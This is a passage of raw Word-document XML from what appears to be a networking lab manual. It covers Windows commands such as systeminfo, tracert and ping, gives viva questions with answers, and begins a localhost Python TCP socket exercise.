    <w:p w14:paraId="12904D99" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FD9D0E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: This tool displays a list of currently running processes on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507EFDF3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>either a local or remote machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E12147" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C67E02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2280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28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64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DCC4B4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>8. systeminfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E730D27" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: SYSTEMINFO [/S system [/U username [/P [password]]]] [/FO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECC60E5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>format] [/NH]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71ADEEDB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: This tool displays operating system configuration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B13435" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>information for a local or remote machine, including service pack levels.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012C9745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0041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0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65)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B3E685" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>9. tracert</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9F357C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD3D218" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-R] [-S srcaddr] [-4] [-6] target_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052F9E24" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Traces the route packets take to a destination, showing each</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED28021" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>hop and its response time to diagnose network issues.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8A3C8B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97897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78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68)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E417013" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7538A2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>10. ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0A6D60" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E12E381" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-r count] [-s count] [[-j host-list] | [-k host-list]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AE875C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-w timeout] [-R] [-S srcaddr] [-c compartment] [-p]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338B9071" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-4] [-6] target_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C31057D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Ping tests network connectivity and measures response time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FAC35FF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>between two devices.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA04A36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320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70)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4BB38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0F337846" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus the above windows commands were executed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4499BF51" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="594D4E81" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C9A107" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is the purpose of the ping command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23334E2E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Answer: It checks whether a host or server is reachable on the network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024AFCE0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What does the ipconfig command do in Windows?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D3DFC4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Answer: It displays the IP configuration of the computer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083C1323" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Which command is used in Linux to display network interfaces?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B6E149" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Answer: ifconfig or ip addr.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19ED7082" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. What is the use of the tracert or traceroute command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4501ED8A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Answer: It shows the path taken by packets to reach a destination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76029774" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What is the purpose of the netstat command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C79328D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Answer: It displays active network connections and listening ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30953D57" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="685EFE95" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No :  2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F597B03" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>STUDY OF SOCKET PROGAMMING IN PYTHON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D0F69C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59919450" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To study the concepts of socket programming in python.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F3B28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Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6013D8DA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Socket definition:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747302CD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A network socket is an endpoint of a two-way communication link</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3F69FB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>between two programs or processes - client and server in our case - which are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD1B799" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>running on the network. This can be on the same computer as well as on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7D3455" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>different systems which are connected via the network. Both client/server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604D9338" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>communicate with each other by writing to or reading from the network socket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B15AC3B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The technical equivalent in reality is a telephone communication between two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297D0197" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>participants. The network socket represents the corresponding number of the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB2D380" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>telephone line, or a contract in case of cell phones.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5668A094" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Socket programming in python</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E527C2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032F6B9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Python's core networking library is Socket Module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2FE85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EF1BA08" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Python's socket module has both class-based and instances-based</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7AAFFA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBDF963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6153691" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Class-based method is an intuitive approach which doesn't need an</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DB05DC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>instance of a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7C90B4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4C823AE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>socket object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0D9F55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EA6408B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>For example, in order to print a machine's IP address, you don't</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B06E4F8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>need a socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128ADB15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4037810" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>object. Instead, just call the socket's class-based methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4421E9EF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41853DB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>In instance-based method, if some data needed to be sent to a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1455F731" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>server application,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F8C53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2B32547" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>it is more intuitive to create a socket object to perform that explicit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA9DB26" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>operation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0849302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AC8F87E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>This module has everything you need to build socket servers and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF2000C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>clients.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F89305" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2CE54E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TCP Client-Server Communication Using Socket programming in python:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6465CDE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Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30992A27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7EF2F115" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Create a TCP socket using `socket.socket(AF_INET,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4917A771" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SOCK_STREAM)`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7F7AC9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Bind the socket to `'localhost'` and a specific port using `bind()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5496379A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Listen for incoming client connections using `listen()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DFECD5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Accept a connection, receive the client’s message using `recv()`, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268D71B6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>send a reply using `send()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B500DCA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Ask the user whether to continue; if not, close the socket using</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692DBA79" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>`close()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A57A7B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2FCA3009" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Create a TCP socket using `socket.socket(AF_INET,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA19C36" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SOCK_STREAM)`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F2C6BE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Connect the socket to the server using `connect((‘localhost’, 55555))`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BF3BEC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Send a message to the server using `send()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136A787F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Receive the reply from the server using `recv()` and display it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769D569B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Close the socket connection using `close()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D107A8A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C39A7C5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Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE60DC7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46AB63A2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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381A1D9C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sockfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEEC8C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print('Socket Created')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F98813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sockfd.bind(('localhost',55555))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A1BA14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sockfd.listen(3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6C535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print('Waiting for connections')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C6857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while True:</w:t>
      </w:r>
    </w:p>
